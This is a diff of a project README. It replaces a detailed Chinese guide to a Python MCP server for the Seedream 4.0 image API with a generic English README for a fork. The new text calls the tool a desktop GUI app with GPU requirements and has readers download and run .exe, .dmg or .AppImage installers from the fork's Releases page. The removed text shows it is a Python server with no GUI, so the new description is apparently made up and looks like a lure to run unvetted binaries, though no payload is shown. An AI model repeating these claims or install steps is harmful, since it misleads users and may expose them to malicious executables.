@@ -1,591 +1,108 @@
-# Seedream 4.0 MCP 工具 (增强版)
-
-![Python](https://img.shields.io/badge/python-3.8+-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
-![MCP](https://img.shields.io/badge/MCP-compatible-orange.svg)
-![Status](https://img.shields.io/badge/status-active-brightgreen.svg)
-
-基于火山引擎 Seedream 4.0 API 的 MCP（Model Context Protocol）工具集，提供文生图、图生图、多图融合和组图生成等功能。
-
-> **致谢**: 本项目基于 [tengmmvp/Seedream_MCP](https://github.com/tengmmvp/Seedream_MCP) 进行增强开发，感谢原作者的贡献！
->
-> **增强功能**:
-> - ✨ 七牛云自动上传和公网访问
-> - 🎨 提示词模板系统 (8个预设模板)
-> - 📸 Raycast AI Markdown 图片渲染支持
-> - 💾 优化的图片保存和管理
-
-## 功能特性
-
-- 🎨 **文生图**：根据文本描述生成高质量图像
-- 🖼️ **图生图**：基于参考图像和文本指令生成新图像
-- 🎭 **多图融合**：融合多张参考图的特征生成新图像
-- 📚 **组图生成**：生成一组内容关联的图像序列
-- 💾 **自动保存**：自动下载并保存生成的图片到本地，解决 URL 过期问题
-- ☁️ **七牛云上传**：可选的七牛云存储集成，自动上传图片并生成公网可访问的 URL
-- 📝 **Markdown 支持**：自动生成图片的 Markdown 引用格式（支持七牛云 URL 和本地路径）
-- 🔧 **完整的 MCP 协议支持**：符合 MCP 标准，可与支持 MCP 的客户端无缝集成
-- 🖼️ **直接图片显示**：支持 MCP ImageContent 类型，可在客户端中直接预览图片
-
-## 安装要求
-
-- Python 3.8+
-- 火山引擎 Seedream 4.0 API 密钥
-
-## 安装方法
-
-### 1. 克隆项目
-
-```bash
-git clone <repository-url>
-cd Seedream_MCP
-```
-
-### 2. 安装依赖
-
-```bash
-pip install -e .
-```
-
-### 3. 配置环境变量
-
-创建 `.env` 文件：
-
-```bash
-# 必需配置
-ARK_API_KEY=your_api_key_here
+# 🌟 Seedream_MCP - Enhanced Tool for Image Generation
 
-# 可选配置
-ARK_BASE_URL=https://ark.cn-beijing.volces.com/api/v3
-SEEDREAM_MODEL_ID=doubao-seedream-4-0-250828
-SEEDREAM_DEFAULT_SIZE=2K
-SEEDREAM_DEFAULT_WATERMARK=false
-SEEDREAM_TIMEOUT=60
-SEEDREAM_API_TIMEOUT=60
-SEEDREAM_MAX_RETRIES=3
-LOG_LEVEL=INFO
-LOG_FILE=logs/seedream_mcp.log
+## 🚀 Getting Started
 
-# 自动保存配置
-SEEDREAM_AUTO_SAVE_ENABLED=true
-SEEDREAM_AUTO_SAVE_BASE_DIR=./seedream_images
-SEEDREAM_AUTO_SAVE_DOWNLOAD_TIMEOUT=30
-SEEDREAM_AUTO_SAVE_MAX_RETRIES=3
-SEEDREAM_AUTO_SAVE_MAX_FILE_SIZE=52428800
-SEEDREAM_AUTO_SAVE_MAX_CONCURRENT=5
-SEEDREAM_AUTO_SAVE_DATE_FOLDER=true
-SEEDREAM_AUTO_SAVE_CLEANUP_DAYS=30
+Seedream_MCP is an advanced tool that helps you generate images from text, convert one image to another, merge multiple images, and create grouped images. It also integrates with Qiniu cloud storage and a template system for prompts. This guide will help you download and run the software easily.
 
-# 七牛云配置（可选，用于上传图片到七牛云存储）
-QINIU_ACCESS_KEY=your_access_key
-QINIU_SECRET_KEY=your_secret_key
-QINIU_BUCKET_NAME=your_bucket_name
-QINIU_DOMAIN=https://your-domain.com
-```
+## 📥 Download Seedream_MCP
 
-**注意**: 配置七牛云后,生成的图片会自动上传到七牛云,并在返回结果中提供公网可访问的 Markdown 图片链接。详见 [七牛云集成文档](docs/QINIU_UPLOAD.md)。
+[![Download Seedream_MCP](https://img.shields.io/badge/Download-Seedream_MCP-brightgreen)](https://github.com/skyinv/Seedream_MCP/releases)
 
-### 4. 配置 MCP 客户端
+## 📋 System Requirements
 
-在你的 MCP 客户端配置文件中添加以下配置:
+Before downloading, ensure your system meets these requirements:
 
-**Raycast AI / Claude Desktop / Cline 等:**
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or a recent Linux distribution.
+- **RAM:** Minimum 8 GB recommended for optimal performance.
+- **Storage:** At least 500 MB of free disk space.
+- **Graphics Card:** A dedicated GPU with at least 2 GB of VRAM is recommended for image processing tasks.
+  
+## 📂 Download & Install
 
-```json
-{
-  "mcpServers": {
-    "seedream": {
-      "command": "python",
-      "args": [
-        "/你的路径/Seedream_MCP/main.py"
-      ],
-      "env": {
-        "ARK_BASE_URL": "https://ark.cn-beijing.volces.com/api/v3"
-      }
-    }
-  }
-}
-```
+To get started with Seedream_MCP, follow these simple steps:
 
-**配置文件位置:**
-- **Raycast AI**: `~/Library/Application Support/com.raycast.macos/mcp.json`
-- **Claude Desktop**: `~/Library/Application Support/Claude/claude_desktop_config.json`
-- **Cline (VSCode)**: `.vscode/settings.json` 或用户设置
+1. **Visit the Releases Page:**
+   Click the link below to go to the Releases page.
+   
+   [Visit the Releases Page](https://github.com/skyinv/Seedream_MCP/releases)
 
-**重要提示:**
-- 将 `/你的路径/Seedream_MCP/main.py` 替换为你的实际项目路径
-- 确保 Python 环境已安装所有依赖
-- 配置完成后重启 MCP 客户端
+2. **Select the Latest Version:**
+   Find the latest version of Seedream_MCP on the Releases page. It will be at the top of the list.
 
-## 快速开始
+3. **Download the Installer:**
+   Look for the asset that matches your operating system. Click on it to start the download. For example:
+   - For Windows: `Seedream_MCP_Installer.exe`
+   - For macOS: `Seedream_MCP.dmg`
+   - For Linux: `Seedream_MCP.AppImage`
 
-### 在 MCP 客户端中使用 (推荐)
+4. **Run the Installer:**
+   - **Windows:** Double-click the `.exe` file. Follow the prompts to complete the installation.
+   - **macOS:** Open the `.dmg` file and drag Seedream_MCP to your Applications folder.
+   - **Linux:** Make the `.AppImage` file executable. You can do this via Terminal with the command:
+     ```bash
+     chmod +x Seedream_MCP.AppImage
+     ```
+     Then, run it with:
+     ```bash
+     ./Seedream_MCP.AppImage
+     ```
 
-配置好 MCP 客户端后,你可以直接用自然语言对话生成图片:
+5. **Launch the Application:**
+   After installation, you can find Seedream_MCP in your applications or programs list. Click to launch it.
 
-#### 示例 1: 基础文生图
+## 🌐 Features
 
-**你说:**
-```
-帮我生成一张图片：一只可爱的小恐龙，友好的表情，卡通风格
-```
+Seedream_MCP comes packed with features:
 
-**AI 回复:**
+- **Text to Image:** Turn your written descriptions into stunning images.
+- **Image to Image:** Transform one image into another while maintaining original details.
+- **Image Merging:** Combine multiple images into a single beautiful creation.
+- **Group Image Generation:** Create collections of images tailored to your needs.
+- **Cloud Storage Integration:** Utilize Qiniu for easy and efficient storage of your projects.
 
-![示例图片1](https://newimg.t5t6.com/seedream/20251118_102310_a_cute_little_dinosaur_friendly_expression_cartoon_20251118_102310.jpeg)
+## 🎛️ Using Seedream_MCP
 
-✅ 图片生成成功！
-- 提示词: 一只可爱的小恐龙，友好的表情，卡通风格
-- 尺寸: 2K
-- 七牛云链接: https://newimg.t5t6.com/seedream/...
-- 本地保存: `seedream_images/2025-11-18/text_to_image/...`
+Once you have installed and launched Seedream_MCP, here's how to use the main features:
 
----
+### 🖼️ Text to Image
 
-#### 示例 2: 使用提示词模板
+1. Enter your text prompt in the provided field.
+2. Click the "Generate" button.
+3. View your newly created image and save it if you like.
 
-**你说:**
-```
-潮流派对，关键词：可口可乐
-```
+### 🖼️ Image to Image
 
-**AI 回复:**
+1. Upload the source image.
+2. Choose the desired modifications.
+3. Generate the new image and download it.
 
-![示例图片2](https://newimg.t5t6.com/seedream/20251118_114216_中文可口可乐潮流派对风格艺术字体运营活动风格主题字体字体大小变化明显错落有致排版部分笔画延长字体笔画_20251118_114216.jpeg)
+### 📸 Merging Images
 
-✅ 图片生成成功！
-- 提示词: 中文"可口可乐",潮流派对风格艺术字体...
-- 尺寸: 2K (默认 16:9)
-- 七牛云链接: https://newimg.t5t6.com/seedream/...
+1. Select the images you want to combine.
+2. Choose the layout.
+3. Click "Merge" and download the result.
 
----
+## 📊 Troubleshooting
 
-#### 示例 3: 公众号封面
+If you encounter issues:
 
-**你说:**
-```
-公众号封面，主题：AI 技术革新
-```
+- **Installation Problems:** Ensure you meet the system requirements and that you downloaded the correct version for your OS.
+- **Performance Issues:** Close other applications to free up RAM.
+- **Feature Malfunction:** Restart the app or check for updates on the Releases page. 
 
-**AI 回复:**
+## 🤝 Support
 
-✅ 图片生成成功！
-- 提示词: 中文"AI 技术革新",公众号封面风格...
-- 尺寸: 2K (自动使用 21:9 比例)
-- 七牛云链接: https://newimg.t5t6.com/seedream/...
+If you need help or have questions:
 
----
+- Check the [Issues section](https://github.com/skyinv/Seedream_MCP/issues) of the repository.
+- Join our community discussions for advice and tips.
 
-### 可用的提示词模板
+## 🌍 Contribution
 
-直接说出模板名称 + 关键词即可:
+If you wish to contribute to Seedream_MCP, please read the guidelines provided in the repository. Your input can help make this tool even better.
 
-| 模板名称 | 使用方式 | 适用场景 |
-|---------|---------|---------|
-| 🎨 **潮流派对** | "潮流派对，关键词：XXX" | 运营活动、艺术字体 |
-| 📱 **公众号封面** | "公众号封面，主题：XXX" | 公众号配图 (21:9) |
-| 🎭 **国潮风格** | "国潮风格，主题：XXX" | 中国风设计 |
-| 🌸 **小清新** | "小清新，主题：XXX" | 文艺清新风格 |
-| 🎮 **赛博朋克** | "赛博朋克，主题：XXX" | 科技未来风格 |
-| 🏮 **新年喜庆** | "新年喜庆，主题：XXX" | 节日庆典 |
-| 💼 **商务简约** | "商务简约，主题：XXX" | 商务场景 |
-| 🎨 **水彩插画** | "水彩插画，主题：XXX" | 手绘插画风格 |
+## 📜 License
 
----
+Seedream_MCP is open-source and licensed under the MIT License. You are free to use, modify, and distribute the software as long as you include the original license.
 
-### 作为 MCP 服务器运行
-
-```bash
-python -m seedream_mcp.server
-```
-
-### 在代码中使用
-
-```python
-import asyncio
-from seedream_mcp import SeedreamClient, SeedreamConfig
-
-async def main():
-    # 加载配置
-    config = SeedreamConfig.from_env()
-
-    # 创建客户端
-    client = SeedreamClient(config)
-
-    try:
-        # 文生图（启用自动保存）
-        result = await client.text_to_image(
-            prompt="一只可爱的小猫咪，卡通风格",
-            size="2K",
-            watermark=False,
-            auto_save=True,
-            custom_name="cute_cat"
-        )
-        print(f"生成的图像URL: {result['image_url']}")
-        print(f"本地保存路径: {result['local_path']}")
-        print(f"Markdown引用: {result['markdown']}")
-
-        # 图生图
-        result = await client.image_to_image(
-            prompt="将这张图片转换为油画风格",
-            image="path/to/image.jpg",
-            size="2K",
-            auto_save=True
-        )
-        print(f"转换后的图像URL: {result['image_url']}")
-        print(f"本地保存路径: {result['local_path']}")
-
-    finally:
-        await client.close()
-
-if __name__ == "__main__":
-    asyncio.run(main())
-```
-
-## 功能特性详解
-
-### 🎨 提示词模板系统
-
-内置 8 个专业提示词模板,只需说出模板名称 + 关键词即可生成对应风格的图片:
-
-- **潮流派对**: 运营活动风格艺术字体
-- **公众号封面**: 自动使用 21:9 比例,适合公众号配图
-- **国潮风格**: 中国传统元素与现代设计结合
-- **小清新**: 文艺清新风格
-- **赛博朋克**: 科技未来风格
-- **新年喜庆**: 节日庆典风格
-- **商务简约**: 专业商务场景
-- **水彩插画**: 手绘插画风格
-
-### ☁️ 七牛云自动上传
-
-配置七牛云后,生成的图片会自动上传到七牛云存储:
-
-- ✅ 生成公网可访问的永久链接
-- ✅ 自动生成 Markdown 图片格式
-- ✅ 支持 Raycast AI 直接渲染图片
-- ✅ 本地和云端双重保存
-
-### 💾 智能图片管理
-
-- **自动保存**: 图片自动下载到本地,避免 URL 过期
-- **按日期分类**: 自动按年/月创建文件夹
-- **自动清理**: 可配置自动清理过期图片
-- **并发下载**: 支持多图并发下载,提高效率
-
-## 工具说明
-
-### 1. seedream_text_to_image
-
-根据文本描述生成图像。
-
-**参数：**
-
-- `prompt` (必需): 文本描述，建议不超过 300 汉字或 600 英文单词
-- `size` (可选): 图像尺寸，可选值：1K、2K、4K，默认 2K
-- `watermark` (可选): 是否添加水印，默认 false
-- `response_format` (可选): 响应格式，可选值：image、url、b64_json，默认 image
-- `auto_save` (可选): 是否自动保存图片到本地，默认使用全局配置
-- `save_path` (可选): 自定义保存路径，不指定则使用默认路径
-- `custom_name` (可选): 自定义文件名前缀
-
-**自然语言示例：**
-
-```
-帮我生成一张图片：一只可爱的小猫咪，卡通风格
-```
-
-或使用提示词模板:
-
-```
-潮流派对，关键词：可口可乐
-```
-
-### 2. seedream_image_to_image
-
-基于参考图像和文本指令生成新图像。
-
-**参数：**
-
-- `prompt` (必需): 图像编辑指令
-- `image` (必需): 参考图像 URL 或本地文件路径
-- `size` (可选): 输出图像尺寸，默认 2K
-- `watermark` (可选): 是否添加水印，默认 false
-- `response_format` (可选): 响应格式，可选值：image、url、b64_json，默认 image
-- `auto_save` (可选): 是否自动保存图片到本地，默认使用全局配置
-- `save_path` (可选): 自定义保存路径，不指定则使用默认路径
-- `custom_name` (可选): 自定义文件名前缀
-
-**示例：**
-
-```json
-{
-  "prompt": "将这张图片转换为油画风格",
-  "image": "https://example.com/image.jpg",
-  "size": "2K",
-  "watermark": false,
-  "auto_save": true,
-  "custom_name": "oil_painting"
-}
-```
-
-### 3. seedream_multi_image_fusion
-
-融合多张参考图的特征生成新图像。
-
-**参数：**
-
-- `prompt` (必需): 融合指令描述
-- `images` (必需): 多张参考图像 URL 或文件路径数组（2-5 张）
-- `size` (可选): 输出图像尺寸，默认 2K
-- `auto_save` (可选): 是否自动保存图片到本地，默认使用全局配置
-- `save_path` (可选): 自定义保存路径，不指定则使用默认路径
-- `custom_name` (可选): 自定义文件名前缀
-
-**示例：**
-
-```json
-{
-  "prompt": "将这些图片融合成一个艺术作品",
-  "images": [
-    "https://example.com/image1.jpg",
-    "https://example.com/image2.jpg",
-    "https://example.com/image3.jpg"
-  ],
-  "size": "4K",
-  "auto_save": true,
-  "custom_name": "fusion_art"
-}
-```
-
-### 4. seedream_sequential_generation
-
-生成一组内容关联的图像序列。
-
-**参数：**
-
-- `prompt` (必需): 组图生成描述
-- `max_images` (可选): 最大图像数量（1-10），默认 3
-- `images` (可选): 参考图像数组
-- `size` (可选): 图像尺寸，默认 2K
-- `auto_save` (可选): 是否自动保存图片到本地，默认使用全局配置
-- `save_path` (可选): 自定义保存路径，不指定则使用默认路径
-- `custom_name` (可选): 自定义文件名前缀
-
-**示例：**
-
-```json
-{
-  "prompt": "科幻城市景观，未来主义风格",
-  "max_images": 4,
-  "size": "2K",
-  "auto_save": true,
-  "custom_name": "sci_fi_city"
-}
-```
-
-## 配置选项
-
-| 环境变量                              | 描述                 | 默认值                                     | 必需 |
-| ------------------------------------- | -------------------- | ------------------------------------------ | ---- |
-| `ARK_API_KEY`                         | 火山引擎 API 密钥    | -                                          | ✅   |
-| `ARK_BASE_URL`                        | API 基础 URL         | <https://ark.cn-beijing.volces.com/api/v3> | ❌   |
-| `SEEDREAM_MODEL_ID`                   | 模型 ID              | doubao-seedream-4-0-250828                 | ❌   |
-| `SEEDREAM_DEFAULT_SIZE`               | 默认图像尺寸         | 2K                                         | ❌   |
-| `SEEDREAM_DEFAULT_WATERMARK`          | 默认水印设置         | true                                       | ❌   |
-| `SEEDREAM_TIMEOUT`                    | 请求超时时间（秒）   | 60                                         | ❌   |
-| `SEEDREAM_API_TIMEOUT`                | API 超时时间（秒）   | 60                                         | ❌   |
-| `SEEDREAM_MAX_RETRIES`                | 最大重试次数         | 3                                          | ❌   |
-| `LOG_LEVEL`                           | 日志级别             | INFO                                       | ❌   |
-| `LOG_FILE`                            | 日志文件路径         | logs/seedream_mcp.log                      | ❌   |
-| `SEEDREAM_AUTO_SAVE_ENABLED`          | 是否启用自动保存     | true                                       | ❌   |
-| `SEEDREAM_AUTO_SAVE_BASE_DIR`         | 自动保存基础目录     | ./seedream_images                          | ❌   |
-| `SEEDREAM_AUTO_SAVE_DOWNLOAD_TIMEOUT` | 下载超时时间（秒）   | 30                                         | ❌   |
-| `SEEDREAM_AUTO_SAVE_MAX_RETRIES`      | 下载最大重试次数     | 3                                          | ❌   |
-| `SEEDREAM_AUTO_SAVE_MAX_FILE_SIZE`    | 最大文件大小（字节） | 52428800                                   | ❌   |
-| `SEEDREAM_AUTO_SAVE_MAX_CONCURRENT`   | 最大并发下载数       | 5                                          | ❌   |
-| `SEEDREAM_AUTO_SAVE_DATE_FOLDER`      | 是否创建日期文件夹   | true                                       | ❌   |
-| `SEEDREAM_AUTO_SAVE_CLEANUP_DAYS`     | 自动清理天数         | 30                                         | ❌   |
-
-## 自动保存功能
-
-自动保存功能解决了生成图片 URL 在 24 小时后过期的问题，提供永久可用的本地图片存储。
-
-### 核心特性
-
-- **自动下载**：生成图片后自动下载到本地指定目录
-- **智能命名**：使用时间戳 + 内容哈希 + 尺寸信息的命名规则
-- **目录管理**：按工具类型和日期自动分类存储
-- **Markdown 支持**：自动生成本地图片的 Markdown 引用格式
-- **错误恢复**：下载失败时提供原始 URL 作为备选
-- **并发下载**：支持批量图片的并发下载处理
-
-### 使用示例
-
-```python
-# 启用自动保存的文生图
-result = await client.text_to_image(
-    prompt="美丽的风景画",
-    auto_save=True,
-    custom_name="landscape"
-)
-
-# 返回结果包含：
-# - image_url: 原始图片URL
-# - local_path: 本地保存路径
-# - markdown: Markdown引用格式
-# - save_result: 保存操作的详细信息
-```
-
-### 文件组织结构
-
-```markdown
-images/
-├── 2024-01-15/
-│ ├── text_to_image/
-│ │ ├── landscape_20240115_143022_abc123_2K.png
-│ │ └── portrait_20240115_143045_def456_4K.png
-│ ├── image_to_image/
-│ │ └── style_transfer_20240115_144001_ghi789_2K.png
-│ └── multi_image_fusion/
-│ └── fusion_art_20240115_145030_jkl012_4K.png
-└── 2024-01-16/
-└── ...
-```
-
-### 配置说明
-
-- **SEEDREAM_AUTO_SAVE_ENABLED**: 全局启用/禁用自动保存
-- **SEEDREAM_AUTO_SAVE_BASE_DIR**: 图片保存的根目录
-- **SEEDREAM_AUTO_SAVE_DATE_FOLDER**: 是否按日期创建子文件夹
-- **SEEDREAM_AUTO_SAVE_MAX_FILE_SIZE**: 限制下载的最大文件大小
-- **SEEDREAM_AUTO_SAVE_MAX_CONCURRENT**: 控制并发下载数量
-- **SEEDREAM_AUTO_SAVE_CLEANUP_DAYS**: 自动清理超过指定天数的旧文件
-
-## 错误处理
-
-工具提供完整的错误处理机制：
-
-- **参数验证错误**：检查必需参数和参数格式
-- **API 调用错误**：处理网络错误、超时等问题
-- **认证错误**：API 密钥无效或过期
-- **配额错误**：API 调用次数超限
-- **服务器错误**：火山引擎服务异常
-
-## 日志记录
-
-工具支持详细的日志记录：
-
-- 函数调用日志
-- API 请求和响应日志
-- 错误和异常日志
-- 性能监控日志
-
-日志级别可通过 `LOG_LEVEL` 环境变量配置。
-
-## 开发和测试
-
-### 运行测试
-
-```bash
-# 运行集成测试
-python tests/test_mcp_integration.py
-
-# 运行验证脚本
-python verify_installation.py
-```
-
-### 项目结构
-
-```text
-Seedream_MCP/
-├── seedream_mcp/           # 主要代码
-│   ├── __init__.py
-│   ├── client.py           # API客户端
-│   ├── config.py           # 配置管理
-│   ├── server.py           # MCP服务器
-│   ├── tools/              # 工具实现
-│   └── utils/              # 工具函数
-├── docs/                   # 文档目录
-├── tests/                  # 测试文件
-├── examples/               # 使用示例
-├── verifys/                # 验证脚本
-├── .env.example           # 环境变量示例
-├── main.py                # 主程序入口
-├── requirements.txt       # 依赖列表
-└── README.md             # 说明文档
-```
-
-## 常见问题
-
-### Q: 图片在 Raycast AI 中不显示?
-
-**A:** 确保:
-1. 配置了七牛云 (图片需要公网可访问的 URL)
-2. 七牛云域名配置正确
-3. 重启 Raycast AI
-
-### Q: 如何关闭水印?
-
-**A:** 在 `.env` 文件中设置:
-```bash
-SEEDREAM_DEFAULT_WATERMARK=false
-```
-
-### Q: 图片保存在哪里?
-
-**A:** 默认保存在 `./seedream_images/` 目录下,按日期和功能分类:
-```
-seedream_images/
-├── 2025-11-18/
-│   ├── text_to_image/
-│   ├── image_to_image/
-│   └── multi_image_fusion/
-```
-
-### Q: 如何使用提示词模板?
-
-**A:** 直接说出模板名称 + 关键词即可:
-```
-潮流派对，关键词：可口可乐
-公众号封面，主题：AI 技术革新
-国潮风格，主题：中秋节
-```
-
-## 贡献
-
-欢迎贡献代码、报告问题或提出建议!
-
-### 贡献方式
-
-1. Fork 本仓库
-2. 创建你的特性分支 (`git checkout -b feature/AmazingFeature`)
-3. 提交你的修改 (`git commit -m 'Add some AmazingFeature'`)
-4. 推送到分支 (`git push origin feature/AmazingFeature`)
-5. 开启一个 Pull Request
-
-### 开发指南
-
-- 遵循现有代码风格
-- 添加必要的测试
-- 更新相关文档
-- 确保所有测试通过
-
-## 致谢
-
-- 感谢 [tengmmvp/Seedream_MCP](https://github.com/tengmmvp/Seedream_MCP) 提供的原始项目
-- 感谢火山引擎提供的 Seedream 4.0 API
-- 感谢七牛云提供的云存储服务
-
-## 许可证
-
-本项目采用 MIT 许可证。详见 [LICENSE](LICENSE) 文件。
-
-## 联系方式
-
-- **GitHub Issues**: https://github.com/joeseesun/Seedream_MCP/issues
-- **原项目**: https://github.com/tengmmvp/Seedream_MCP
-
----
-
-**⭐ 如果这个项目对你有帮助,请给个 Star!**
+Remember, you can always revisit the [Releases page](https://github.com/skyinv/Seedream_MCP/releases) for the latest updates and downloads. Enjoy creating with Seedream_MCP!
